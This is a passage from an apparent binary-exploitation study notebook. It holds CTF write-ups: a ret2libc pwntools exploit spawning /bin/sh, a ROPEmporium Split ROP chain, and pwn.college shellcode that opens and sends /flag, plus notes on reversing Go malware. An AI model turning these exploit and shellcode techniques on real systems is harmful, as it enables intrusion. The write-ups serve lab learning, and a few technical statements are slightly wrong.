<p>Now to calculate the <code>libc base address</code>, we can substract the offset of the <code>puts</code> function in libc to the address of <code>puts</code> we leaked, this should give us the base address. To find an offset we are going to use the readelf utility.</p>
<pre><code>readelf -s ./libc.so.6 | grep GLIBC | grep puts
   191: 0000000000080aa0   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
   422: 0000000000080aa0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
   496: 0000000000126550  1240 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
   678: 0000000000128460   750 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
   1141: 000000000007f2d0   396 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
</code></pre>
<p>We see that the <code>puts</code> function as an offset of <code>0000000000080aa0</code> in <code>libc</code>, let's add the following to our script.</p>
<pre><code class="language-py">puts_libc_offset = 0x0000000000080aa0
libc.address = leak - puts_libc_offset
pwn.log.info(f&quot;Base address of libc : {hex(libc.address)}&quot;)
</code></pre>
<p>Next we can create a <code>ROP</code> object and exploit the program using a call to <code>system(&quot;/bin/sh&quot;)</code>, this is pretty simple to do. Add the following to your script. <em>Note that for an obscure reason, the pop_rdi didn't worked with the second payload, so i used a single ret instead and it worked well</em></p>
<pre><code class="language-py">rop = pwn.ROP(libc)
rop.system(next(libc.search(b&quot;/bin/sh\x00&quot;)))
io.sendline(pwn.flat({PADDING: [ret, rop.chain()]}))
</code></pre>
<p>You should have now the following code in your script.</p>
<pre><code class="language-py">import pwn

e = pwn.ELF(&quot;./naughty_list&quot;, checksec=False)
libc = pwn.ELF(&quot;libc.so.6&quot;, checksec=False)
io = pwn.process(e.path)
pwn.context.arch = &quot;amd64&quot;
PADDING = 40

pop_rdi = pwn.p64(0x0000000000401443)
ret = pwn.p64(0x0000000000400756)
puts_at_got = pwn.p64(e.got.puts)
puts_at_plt = pwn.p64(e.plt.puts)
get_descr = pwn.p64(e.symbols.get_descr)

payload = [
    b&quot;A&quot;*PADDING,
    pop_rdi,
    puts_at_got,
    puts_at_plt,
    get_descr
]

io.sendlineafter(b&quot;:&quot;, b&quot;PENIS&quot;)
io.sendlineafter(b&quot;:&quot;, b&quot;PENIS&quot;)
io.sendlineafter(b&quot;:&quot;, b&quot;69&quot;)
io.sendlineafter(b&quot;:&quot;, b&quot;&quot;.join(payload))

io.recvlines(6)
leak = pwn.unpack(io.recvline()[:6].ljust(8, b&quot;\x00&quot;))
pwn.log.info(f&quot;Leaked address {hex(leak)}&quot;)

puts_libc_offset = 0x080aa0
libc.address = leak - puts_libc_offset
pwn.log.info(f&quot;Base address of libc : {hex(libc.address)}&quot;)

rop = pwn.ROP(libc)
rop.system(next(libc.search(b&quot;/bin/sh\x00&quot;)))
io.sendlineafter(b&quot;:&quot;, pwn.flat({PADDING: [ret, rop.chain()]}))
io.interactive()
</code></pre>
<p>Running it either locally or remotely on a vulnerable machine drops us a shell, you can read the flag in the flag.txt file ! Hopefully you enjoyed the challenge and the writeup.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ropemporium-split"><a class="header" href="#ropemporium-split">ROPEmporium (Split)</a></h1>
<p>Split is the second challenge of the ROPemporium series on binary exploitation, it's a pretty simple challenge that just require you to make a system call using the address of the string &quot;/bin/cat flag.txt&quot;, to find this string you can just look at the different functions the binary has and you should see one called <code>usefulString</code>, this symbol should contain the string we want.</p>
<p>For this challenge we will heavily rely on pwntools, python and gdb, although the challenge is pretty simple (took me 5 mins to solve) i think it's pretty educative on how to rop properly.</p>
<h2 id="solving-the-challenge-3"><a class="header" href="#solving-the-challenge-3">Solving the Challenge</a></h2>
<p>Looking at the <a href="https://ropemporium.com/challenge/split.html">ROPEmporium Website</a> we are given the following instructions.</p>
<pre><code>Still here

I'll let you in on a secret: that useful string &quot;/bin/cat flag.txt&quot; is still present in this binary, as is a call to system(). It's just a case of finding them and chaining them together to make the magic happen. 
</code></pre>
<p>We know there is the string &quot;/bin/cat flag.txt&quot; in the binary, and we can easily make a system call since the function is present in the binary.</p>
<pre><code class="language-py">import pwn

pwn.context.arch = &quot;amd64&quot;
e = pwn.ELF(&quot;./split&quot;)

def find_eip(payload):
    io = pwn.process(e.path)
    io.sendlineafter(b&quot;&gt; &quot;, payload)
    io.wait()
    rip_offset = pwn.cyclic_find(io.corefile.read(io.corefile.rsp, 4))
    pwn.log.info(&quot;Located RIP offset at {a}&quot;.format(a=rip_offset))
    return rip_offset

pop_rdi_ret = pwn.p64(0x4007c3)
offset = find_eip(pwn.cyclic(100))
io = pwn.process(e.path)
rop = pwn.ROP(e)
rop.system(e.symbols.usefulString)

payload = [
    b&quot;A&quot;*offset,
    rop.chain(),
    pop_rdi_ret
]

io.sendlineafter(b&quot;&gt; &quot;, b&quot;&quot;.join(payload))
io.interactive()
</code></pre>
<p>Running the following script should automatically find the crash offset and it will call system(&quot;/bin/cat flag.txt&quot;).</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="anatomy-of-a-gopher"><a class="header" href="#anatomy-of-a-gopher">Anatomy of a Gopher</a></h1>
<p>This sections are my notes relating the SANS talk &quot;Anatomy of a Gopher&quot;, by hex0punk (Alex Useche). The talk is still available on youtube at the following link <a href="%22https://www.youtube.com/watch?v=wWNbnEp_4ZE%22">talk</a>.</p>
<h2 id="what-are-we-doing"><a class="header" href="#what-are-we-doing">What are we doing</a></h2>
<ul>
<li>Learning about what makes go binaries different than C and C++ binaries.</li>
<li>Identifying techniques for recognizing and conducting analysis of go binaries.</li>
<li>Tips for finding vulnerabilities in go binaries.</li>
<li>Identifying common patterns found in go binaries.</li>
<li>Learning about protections that can be added to go binaries.</li>
</ul>
<h2 id="the-go-assembler"><a class="header" href="#the-go-assembler">The GO Assembler</a></h2>
<ul>
<li>The go compiler is based on plan9 compiler.</li>
<li>Semi-abstract instruction set.</li>
<li>Pseudo-Assembly.</li>
<li>Not a direct representation of the underlying machine (i.e MOV may be a LD)</li>
<li>It also introduces a set of pseudo registers (that you might not have seen before).</li>
</ul>
<h2 id="tools"><a class="header" href="#tools">Tools</a></h2>
<ul>
<li><strong>Go Tool Objdump</strong>
You can use <strong>objdump</strong> along with <strong>go tool</strong> to dump binary informations (functions, sections,...) </li>
</ul>
<p>You would typically use it the following way.</p>
<pre><code>$ go tool objdump -s &lt;func&gt; &lt;bin&gt; 
$ go tool objdump &lt;arguments&gt; &lt;bin&gt;
</code></pre>
<p>A big advantage of using <strong>go tool objdump</strong> is that you get line numbers in code.This can help you group instructions by operations.</p>
<p><em>Note that pretty much every disassembler does a great job at disassembling go binaries, this includes (r2, ghidra, ida, cutter, binary ninja, hopper, gdb,...).</em></p>
<p><em>Usually it is a best practice to use as many disassembler as you can and compare and catch on differences in the output, i usually like ghidra + ida or ida + binary ninja</em></p>
<h2 id="default-protections-on-go-binaries"><a class="header" href="#default-protections-on-go-binaries">Default Protections on Go Binaries</a></h2>
<p>When you run go build, it should enable <strong>NX</strong> <em>(or No Execute if you prefer)</em> by default on the resulting binary. </p>
<p>However note that <strong>Position Independent Code (PIC or PIE) and Stack Canaries</strong> are usually disabled <strong>by default</strong>, also note that binaries are not stripped.</p>
<p>ROP are a lot easier on go binaries since <strong>PIC (or PIE)</strong> is disabled by default.</p>
<h4 id="how-to-enable-protections-on-go-binaries"><a class="header" href="#how-to-enable-protections-on-go-binaries">How to enable protections on Go binaries.</a></h4>
<ul>
<li>Enable Stack Protections <code>export CGO_LDFLAGS='-fstack-protector'</code></li>
<li>Strip the binary <code>GOOS=linux go build -ldflags=&quot;-s -w&quot;</code></li>
<li>Enable PIE <code>export GOFLAGS='-buildmode=pie'</code></li>
<li>Strip functions names and reduce size <code>Get UPX and pack the file</code></li>
</ul>
<h2 id="searching-for-strings"><a class="header" href="#searching-for-strings">Searching for Strings</a></h2>
<p>Searching for strings in a go binary is a little harder than usual, because they are clumped together in a massive string table.</p>
<ul>
<li>Go does not store null terminated strings.</li>
<li>Strings are clumped together, while keeping a separate table with length information.</li>
<li>This can make it difficult to look for string cross-references.</li>
<li>We can use a project like <a href="https://github.com/carvesystems/gostringsr2">gostringsr2</a> to parse strings.</li>
<li>When working with MachO binaries, you'd have to list strings from .rodata or entire binary</li>
</ul>
<p>The usage of <strong>grep</strong> or filters is basically a must when looking at a go binary strings, because finding yourself in this massive string table can be quite hard.</p>
<p><strong>rabin2</strong>
rabin2 is very useful when looking at go strings and is absolutely straightforward to use.</p>
<pre><code>rabin2 -zz &lt;binary&gt; | grep &lt;char.sequence&gt;
</code></pre>
<p><em>Just like with disassemblers, always use 2-3 different program when looking at strings and check for any differences, it might be hard to see with go binaries since they are statically linked, therefore all library strings should also be in the string table by default.</em></p>
<h2 id="searching-for-functions"><a class="header" href="#searching-for-functions">Searching for functions</a></h2>
<p>Searching for functions is a lot easier than searching for strings in go binaries, which is the opposite of usual C/C++ binaries where strings are by default easier to find than functions.</p>
<p>Most of the time, even <strong>stripped</strong>, functions are still easy to find in go binaries, which is awesome to us anal-ysts.</p>
<h2 id="finding-the-main-function"><a class="header" href="#finding-the-main-function">Finding the main function</a></h2>
<p>Finding the main function is the easiest to find in go binaries, even in stripped ones... to find the main function look for either <strong>main.main or main_main</strong>.</p>
<h2 id="go-stacks"><a class="header" href="#go-stacks">Go Stacks</a></h2>
<p>An important thing to know about Go binaries is that they handle stacks differently, here's the main difference.</p>
<ul>
<li>Go routines have small stacks by default (2 kibibyte = 1024 bytes stack)</li>
<li>Many goroutines will call <strong>morestack</strong> (sym.runtime.morestack_noctxt), to grow the stack (in powers of 2) as needed using stack copying.</li>
<li>This is called because go can't be sure the function will outgrow the stack (i.e recursive functions) given non-deterministic goroutines.</li>
<li>When this occurs, stack grows, pointers in the stack are updated.</li>
<li>Additionally, each function compares its stack pointer against <strong>g-&gt;stackguard</strong> to check for overflow.</li>
<li>Go uses 8 byte alignment on stack.</li>
</ul>
<h2 id="conventions-arguments-and-return-values"><a class="header" href="#conventions-arguments-and-return-values">Conventions (Arguments and Return Values)</a></h2>
<p>Go binaries places return values on the stack, as opposed to C where return values are placed in registers (usually eax for x86).</p>
<p>As for return values, function arguments are also placed on the stack rather than registers.</p>
<p><em>Understanding go internal libraries can significantly help us understand what is going on in the assembly code. Read the Go Docs !</em></p>
<h2 id="go-error-handling"><a class="header" href="#go-error-handling">Go Error Handling</a></h2>
<ul>
<li><strong>error</strong> is an interface.</li>
<li>Error handling is clumsy in go.</li>
<li>Bugs due to unhandled errors are common.</li>
<li>When checking for <strong>error != nil</strong> we load the error vtable and error value.</li>
<li>Then we test if the value is nil.</li>
<li>And branch depending on the result.</li>
</ul>
<h2 id="reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky"><a class="header" href="#reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky">Reversing in action: Golang malware used in the SolarWinds attack (Kaspersky)</a></h2>
<p>From now on, the notes are not related to the <strong>Anatomy of Go video</strong>, but on this <a href="https://www.youtube.com/watch?v=_cL-OwU9pFQ">Kaspersky course</a>. I highly recommend that you go watch the video too.</p>
<p>This course is an absolute pearl and helped me a lot learn more about Go and Reverse Engineering, we focus principally on reversing a piece of malware that was used in the SolarWinds breach a little earlier this year, the malware in question is <strong>SunShuttle</strong>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky-1"><a class="header" href="#reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky-1">Reversing in action: Golang malware used in the SolarWinds attack (Kaspersky)</a></h1>
<p>This course is a must if your going to reverse go malware, it takes a very deep approach in the analysis of a malware named <strong>SunShuttle</strong>, it was notably used as a fully featured backdoored in the <strong>SolarWinds Breach Indicent</strong>, which was one of the biggest breach in the history of hacking.</p>
<h2 id="introduction"><a class="header" href="#introduction">Introduction</a></h2>
<p><strong>What you will learn</strong> :</p>
<pre><code>- How to reverse-engineer Go Malware
- Fundamentals of the Go Language
</code></pre>
<p><strong>Why it is important ? :</strong></p>
<pre><code>- Go is increasingly being used among malware authors
- Go binaries cannot be tackled with the usual approach
</code></pre>
<p><strong>In Context :</strong> <a href="https://securelist.com/sunburst-backdoor-kazuar">Sunburst Backdoor Kazuar</a></p>
<p>If you haven't did already, go see my notes on <a href="https://exploitation.reversing-ninja.com/anatomy-of-a-gopher.html">Anatomy of a Gopher</a> they might greatly help for this course and also don't forget to go watch the SANS talk by hex0punk about Go Reverse Engineer (link in Anatomy of a Gopher notes).</p>
<p><strong>Things to notes about Go before starting to reverse :</strong></p>
<pre><code>- Generates statically-built executables, this makes the program weigh a LOT more than usual dynamically programs, a simple **Hello World** program can weigh up to **2 Megabytes** that is huge !
- Go does not enable PIC or PIE (Position Independent Code or Executable).
- Go does not stripped binaries by default.
- Go does not enable any stack protections (stack canaries).
- Searching for strings in a Go binary can't be quite a pain in the ass.
- Searching for functions is easier than searching for strings, since functions name aren't stripped.
- Go stacks are really small by default (2 kibibytes or 1024 bytes of stack), therefore many goroutines will call **morestack** (sym.runtime.morestack\_noctxt), to grow the stack size (in powers of 2) as needed using **stack copying**.
</code></pre>
<p>a    - Go uses 8 bytes alignment on the stack.
- Each functions compare it's stack pointer agains't <strong>g-&gt;stackguard</strong> to check for overflow.
- Go binaries can return multiple values, therefore it places all the return values on the stack, because 3 return values would not fit inside rax.
- Decompiling go binaries won't be very useful as it doesn't make the code more readable in a C representation.</p>
<h2 id="practice-reverse-engineering-small-go-programs"><a class="header" href="#practice-reverse-engineering-small-go-programs">Practice Reverse Engineering Small Go Programs</a></h2>
<p>Let's take an example, we will write a small Go program, compile it without optimizations and look at the assembly of it, we will write this small program :</p>
<pre><code class="language-go">package main
import (
    &quot;fmt&quot;
)

// Compiled with disabled optimizations (-gcflags '-N -l')

func main(){
    res := sum(1, 10, 100)
    fmt.Println(&quot;Result = &quot;, res)
}

func sum(a, b, c int) (int){
    return a + b + c
}
</code></pre>
<p><strong>Compile this and open it in IDA or your preferred disassembler and let's start doing some reversing :</strong></p>
<p>First thing to note is that we don't have the usual function prologue</p>
<pre><code class="language-x86asm">    push rbp; 
    mov rbp, rsp
</code></pre>
<p>Instead functions start by checking if the stack is big enough as you can see in the following code</p>
<pre><code class="language-x86asm">    mov rcx, gs:28h; 
    mov rcx, [rcx+0]; 
    lea rax, [rsp+var_8]; 
    cmp rax, [rcx+10h]; 
    jbe address
</code></pre>
<p>In this code we check if the argument at [rsp+var_8] is below the address of <strong>rcx</strong>, which should be something like the stack size or address or offset, i am not sure on this one.</p>
<p>If we were below <strong>rcx</strong> or equal to it, we jump to <strong>sym.runtime.morestack_noctxt</strong>, which as said previously will double the stack size using <strong>stack copying</strong>.</p>
<p>Since this code is usually present at the beginning of every function, you can just ignore it (you can change it's color to black in IDA or what i like to do is right click on the block of code i want to hide and click group node, input a text that represent the block code and confirm).</p>
<p>You should end up with something that look like this if you did my way :</p>
<p><img src="https://i.imgur.com/XMz2wFR.png" alt="Nodes Grouped" /></p>
<p>You can see that i highlighted some stuff, first i highlighted the arguments of the <strong>main_sum</strong> function call, these arguments are <strong>1, 10, 100</strong> respectivily which are the exact same values we passed to main.sum the main function in our source (<strong>sum(1, 10, 100)</strong>).</p>
<p>Secundo i highlighted the function <strong>main_sum</strong> in green, and for those who haven't noticed i have explicitely written where the main code block is, although i assume you would have been able to find it yourself.</p>
<p>Okay now have you already forgotten that Go return values on the stack instead of rax ? hopefully not, let's prove this :</p>
<pre><code class="language-x86asm">mov     [esp+0x40+var_40], 1   
mov     [esp+0x40+var_3C], 0xA
mov     [esp+0x40+var_38], 0x64
call    main_sum
mov     eax, [esp+0x40+var_34]
mov     [esp+0x40+var_28], eax
</code></pre>
<p>We first prepare for the <strong>main_sum</strong> function and put every argument on the stack, each of those arguments takes <strong>4 bytes in size</strong> (we know we are dealing with integers), also note that the arguments are put backward on the stack. We then call our functions main, and return. Our return value has been placed <strong>4 bytes below our first argument (0x64 located at [esp+0x40+var_38])</strong>, our return value is only 4 bytes in size since we have implicitly declared it to be a int in our source code.</p>
<p>One nice thing Ivan teached me is that arguments will be interpreted as variables in the disassembly, you can press <strong>q</strong> on them and it will change them and make them look more like <strong>stack offsets</strong>, renaming variables can be quite useless in any case since variables are used to do very different things throughout the lifetime of the function.
<img src="https://thumbs.gfycat.com/SmoothAmusingGrouper-mobile.mp4" alt="Removing Variables" /></p>
<p>One last thing is the fmt_Printf printf function which we haven't seen yet, it a little bit further in the assembly
<img src="https://i.imgur.com/IWygaIL.png" alt="fmt_Println" /></p>
<p><strong>Let's write a little more complex go program and let's reverse it :</strong>
This time we will use multiple return values with a mini error handling mechanism, the code is going to be once again really easy to read and understand</p>
<pre><code class="language-go">package main
import(
    &quot;fmt&quot;
    &quot;errors&quot;
)

func main(){
    res, s, err := sum(1, 10, 100)
    if err == nil {
        fmt.Println(&quot;Result = &quot;, res, s)
    }
}

func sum(a, b, c int) (int, string, error){
    return a + b + c, &quot;REMA2&quot;, errors.New(&quot;Fake Error&quot;)
}
</code></pre>
<p>Compile the code with the same flags we used earlier (<strong>go build -gcflags &quot;all=-N -l&quot; program.go -o program.exe</strong>), and let's reverse it !</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="embryoasm-level-6"><a class="header" href="#embryoasm-level-6">EmbryoASM Level 6</a></h1>
<p>So this challenge is a little bit harder since we need to compute the modulo of rdi with 256 and rsi with 65536 using only
MOV instructions.</p>
<p>Since i am nowhere near being a shifting, rotating and masking or mathematic wizard, i was struggling at the beginning of this challenge. But thanks to Kanak on discord, he showed us on video a little more how we were supposed to complete the challenge and everything start making sense for me.</p>
<h2 id="how-it-works"><a class="header" href="#how-it-works">How it works</a></h2>
<p>Basically the program asks us to modulo with 256 and 65536, note that :</p>
<pre><code>- 4 is the biggest value 2 bits can address.
- 16 is the biggest value 4 bits can address.
- 256 is the biggest value 8 bits can address.
- 65536 is the biggest value 16 bits can address.
</code></pre>
<p>When we talk about modulo, we always think about division and the remainder of it.</p>
<p>But there's something special about modulo with 4, 16, 256, 65536,... :</p>
<pre><code>- When we do modulo with 4 we're basically asking for the last 2 bits of that number (Square root of 4).
- When we do modulo with 16 we're basically asking for the last 4 bits of that number (Square root of 16).
- When we do modulo with 256 we're basically asking for only the last 8 bits of that number (Square root of 256).
- When we modulo with 65536 we're basically asking for only the last 16 bits of that number (Square root of 65536).
</code></pre>
<p>Examples:</p>
<pre><code>   9382 % 4 = 2         &lt;= Here we access the last 2 bits
   9382 % 16 = 6       &lt;= Here we access the last 4 bits
   9382 % 256 = 166     &lt;= Here we access the last 8 bits
   9382 % 65536 = 9382  &lt;= Here we access the last 16 bits
</code></pre>
<pre><code>  2019249 % 4 = 1        &lt;= Here we access the last 2 bits
  2019249 % 16 = 1      &lt;= Here we access the last 4 bits
  2019249 % 256 = 177    &lt;= Here we access the last 8 bits
  2019249 % 65536 = 53169 &lt;= Here we access the last 16 bits
</code></pre>
<pre><code>  0x12345678 % 4 = 0
  0x12345678 % 16 = 0x8
  0x12345678 % 256 = 0x78
  0x12345678 % 65536 = 0x5678
  0x12345678 % 4294967296 = 0x12345678

  It is sometimes easier to see the pattern using hexadecimal characters.
</code></pre>
<p>But since we can't use division on the challenge we need to know how to compute modulo a different way...</p>
<p>After a bit of research i stumbled across this post on stackoverflow where someone was asking different ways to modulo a certain value, i read that these operations are the same :</p>
<pre><code>    9382 % 4 = 2
    9382 &amp; (4 - 1) = 2        &lt;= Same as the precedent operation

    9382 % 16 = 6
    9382 &amp; (16 - 1) = 6       &lt;= Same as the precedent operation

    9382 % 256 = 166
    9382 &amp; (256 - 1) = 166    &lt;= Same as the precedent operation

    9382 % 65536 = 9382
    9382 &amp; (65536 - 1) = 9382 &lt;= Same as the precedent operation
</code></pre>
<pre><code>    0x12345678 % 16 = 0x8
    0x12345678 &amp; (16 - 1) = 0x8

    0x12345678 % 256 = 0x78
    0x12345678 &amp; (256 - 1) = 0x78
    
    0x12345678 % 65536 = 0x5678
    0x12345678 &amp; (65536 - 1) = 0x5678

    0x12345678 % 4294967296 = 0x12345678
    0x12345678 &amp; (4294967296 - 1) = 0x12345678
</code></pre>
<p>What we're doing is basically <em>masking</em> a number by <strong>AND'ing</strong> with (2 ** n bits we want to access - 1) and this does the same result as doing modulo on (2 ** n bits we want to access).</p>
<p>Let's put this in practice and complete the challenge</p>
<h2 id="solving-the-challenge-4"><a class="header" href="#solving-the-challenge-4">Solving the Challenge</a></h2>
<p>Okay so completing the challenge was pretty simple, we are asked to do the following :</p>
<pre><code>Welcome to EmbryoASMLevel6
==================================================
To interact with any level you will send raw bytes over stdin to this program.
To efficiently solve these problems, first run it once to see what you need,
then craft, assemble, and pipe your bytes to this program.

In this level you will be working with registers. You will be asked to modify
or read from registers_use.

We will now set some values in memory dynamically before each run. On each run
the values will change. This means you will need to do some type of formulaic
operation with registers_use. We will tell you which registers_use are set beforehand
and where you should put the result. In most cases, its rax.

Another cool concept in x86 is the independent access to lower register bytes.
Each register in x86 is 64 bits in size, in the previous levels we have accessed
the full register using rax, rdi or rsi. We can also access the lower bytes of
each register using different register names. For example the lower
32 bits of rax can be accessed using eax, lower 16 bits using ax,
lower 8 bits using al, etc.
MSB                                    LSB
+----------------------------------------+
|                   rax                  |
+--------------------+-------------------+
                     |        eax        |
                     +---------+---------+
                               |   ax    |
                               +----+----+
                               | ah | al |
                               +----+----+
Lower register bytes access is applicable to all registers_use.

Using only the following instruction(s):
mov
Please compute the following:
rax = rdi modulo 256
rbx = rsi module 65536

We will now set the following in preparation for your code:
rdi = 0x57c5
rsi = 0x4fe709fc


Please give me your assembly in bytes (up to 0x1000 bytes):
</code></pre>
<p>Note that on x64 you can access the lower 8 bits of rsi and rdi, using sil and dil, respectively. </p>
<p>This mean we can complete this challenge using only the mov instruction as asked.</p>
<pre><code class="language-x86asm">.global _start
.intel_syntax noprefix
_start:
    mov rax, 0      ; zero out rax
    mov al, dil     ; take the last 8 bits of rdi into last 8 bits of rax
    mov rbx, 0      ; zero out rbx
    mov bx, si      ; take the last 16 bits of rsi into last 16 bits of rbx
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-1"><a class="header" href="#babyshell-level-1">Babyshell Level 1</a></h1>
<p>This is the first challenge of the shellcoding modules from pwn.college, it seems to me like a pretty simple challenge... however make sure to watch the videos on youtube before trying to complete those !</p>
<h2 id="how-the-challenge-works"><a class="header" href="#how-the-challenge-works">How the challenge works</a></h2>
<p>We are basically asked to &quot;inject position independant <strong>shell</strong>-code&quot;, we say position independant because the challenge base address change at every execution.</p>
<p>From our knowledge, we know that most of the time flag is stored in &quot;/flag&quot;, this means we can write a shellcode to read and output us this file.</p>
<p>I highly hope you have a great understanding of syscalls so far, if not i highly recommend you go read <a href="https://man7.org/tlpi/">The Linux Programming Interface</a> and <a href="https://www.oreilly.com/library/view/understanding-the-linux/0596005652/">Understanding the Linux Kernel, 3rd Edition</a>.</p>
<p>We will highly rely on syscalls on this module since it's pretty much the only thing we have at hands, we will rely specifically on <strong>sys_open</strong>, <strong>sys_sendfile</strong> and <strong>sys_exit</strong>.</p>
<p>As it looks pretty obvious, we will first <strong>open</strong> the file (file descriptor), <strong>sendfile</strong> to read the content of that file and send its output to a file descriptor and then <strong>exit</strong> the program cleanly.</p>
<h2 id="solving-the-challenge-5"><a class="header" href="#solving-the-challenge-5">Solving the Challenge</a></h2>
<p>I think we're ready to start writing shellcode, for this we will write a <strong>.s</strong> (source) file, compile it with gcc (<strong>gcc -nostdlib -static solve.s solve</strong>) and extract the <strong>.text</strong> section code (our shellcode), into another file (<strong>objcopy --dump-section .text=shellcode solve</strong>).</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    # Open file descriptor
    mov rsi, 0                  # flags
    lea rdi, [rip+flag]         # path name
    mov rax, 2                  # syscall number (sys_open)
    syscall                     # syscall (call into kernel)

    # Read
    mov rdi, 1                  # out_fd
    mov rsi, rax                # in_fd
    mov rdx, 0                  # offset
    mov r10, 100                # count
    mov rax, 40                 # syscall (sys_sendfile)
    syscall                     # call into the kernel
    
    # Exit
    mov rax, 60                 # syscall (sys_exit)
    mov rdi, 42                 # exit number
    syscall                     # syscall
flag:
    .ascii &quot;/flag\0&quot;
</code></pre>
<p>Execute the program with our ./shellcode redirected to stdin and we should win this challenge :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-3"><a class="header" href="#babyshell-level-3">Babyshell Level 3</a></h1>
<p>Babyshell level 3 is the third challenge from pwn.college shellcoding module, it is pretty simple if you have watched the <a href="https://www.youtube.com/watch?v=715v_-YnpT8&amp;t=1968s">videos for the module</a>.</p>
<h2 id="solving-the-challenge-6"><a class="header" href="#solving-the-challenge-6">Solving The Challenge</a></h2>
<p>Solving the challenge is pretty straight forward, we need to remove all null bytes from our shellcode, if there is any null bytes in our shellcode the program will fail.</p>
<p>The challenge took me a couple hours to solve since i had to find instructions that doesn't contains any null bytes in their opcode, i found the following informations :
- a lot of time <strong>mov</strong> instructions have null bytes in their opcode, however with <strong>rbx</strong> that was not the case, so i used <strong>rbx</strong> a little in the final solution <strong>instead of directly moving the value &quot;/flag&quot; into rdi</strong>.
- if your string ends with a <strong>null character</strong>, you can <strong>replace it for a carriage return.</strong>
- <strong>push and pop</strong> can be easily used as a replacement for the <strong>mov</strong> instruction, just push the value on the stack and pop it back into any register you want, we will use this technique <strong>a LOT</strong>, this way we will spend less time trying to fix mov instructions with null bytes.</p>
<p>With the preceding informations we should have a really got view of how we will solve this challenge.</p>
<p>Let's start writing our shellcode, first we need a opened file descriptor to our flag file :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value &quot;galf&quot; in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a &quot;/&quot; in bl register
	mov bl, 0x2f			# mov 0x2f &quot;/&quot; inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value &quot;/flag&quot; which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel
</code></pre>
<p>When this code executes it should return a file descriptor to the &quot;/flag&quot; file. </p>
<p>We moved the value &quot;/flag&quot; using ebx and a shift left because &quot;/flag&quot; is 5 bits long and moving a 5 bytes value inside rbx (8 bytes register), it would have certainly implied some null bytes in the opcode.</p>
<p>The value &quot;<strong>flag</strong>&quot;, is 4 bytes wide which <strong>fits inside ebx</strong>, so we can just <strong>move &quot;flag&quot; in ebx</strong>, <strong>shift it to the left 8 bits</strong> so we have space to put &quot;/&quot; in the <strong>lower 8 bits of ebx</strong>, and mov <strong>0x2f</strong> in it which is &quot;/&quot; in ascii encoding.</p>
<p>The next step was to actually put rbx inside rdi since rbx is not on the x64 kernel calling convention, so just push the value inside rbx onto the stack and pop it back inside rdi, and you should have done the hardest part in this shellcode.</p>
<p>The next steps are exactly as in the last challenge (babyshell 2), but in this one we'll use <strong>push and pop</strong> instructions instead of using the <strong>mov</strong> instruction for the arguments.</p>
<p>Just like in the last challenge we will use the <strong>sendfile systemcall</strong> to read the file and send it to a file descriptor, in our case (<strong>stdout</strong>).</p>
<p>The function definition for sendfile is the following :</p>
<pre><code class="language-c">ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
</code></pre>
<p>The function takes three arguments, the output file descriptor, the input file descriptor, the offset (in our case 0), and the count of bytes we wish to read.</p>
<p>On x86_64 linux the kernel interface uses the following register as calling convention  : <strong>%rdi, %rsi, %rdx, %r10, %r8 and %r9.</strong> Since <strong>sendfile</strong> had 4 arguments, we will need <strong>%rdi, %rsi, %rdx, %r10</strong>.</p>
<p>Let's write the second part of our shellcode :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value &quot;galf&quot; in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a &quot;/&quot; in bl register
	mov bl, 0x2f			# mov 0x2f &quot;/&quot; inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value &quot;/flag&quot; which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel

	# Read and output the file
	push 1					# push stdin file descriptor number on the stack (out_fd)
	pop rdi					# pop the value in rdi
	push rax				# push the return value from our last systemcall (filedescriptor) inside (in_fd)
	pop rsi 				# pop it inside rsi
	push 0					# push 0 on the stack (offset)
	pop rdx					# pop it inside rdx
	push 1024				# push the number of bytes we wish to read (count)
	pop r10					# pop the number of bytes we wish to read inside r10
	push 40					# push syscall number on the stack
	pop rax					# pop it back inside rax
	syscall 				# call into the kernel
</code></pre>
<p>With the preceding code, if you compile it, it should work and read the file, however we want a clean exit, to avoid any bug with our program when leaving or returning, for this reason we will write a last system call which will cause to exit the program cleanly :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value &quot;galf&quot; in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a &quot;/&quot; in bl register
	mov bl, 0x2f			# mov 0x2f &quot;/&quot; inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value &quot;/flag&quot; which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel

	# Read and output the file
	push 1					# push stdin file descriptor number on the stack (out_fd)
	pop rdi					# pop the value in rdi
	push rax				# push the return value from our last systemcall (filedescriptor) inside (in_fd)
	pop rsi 				# pop it inside rsi
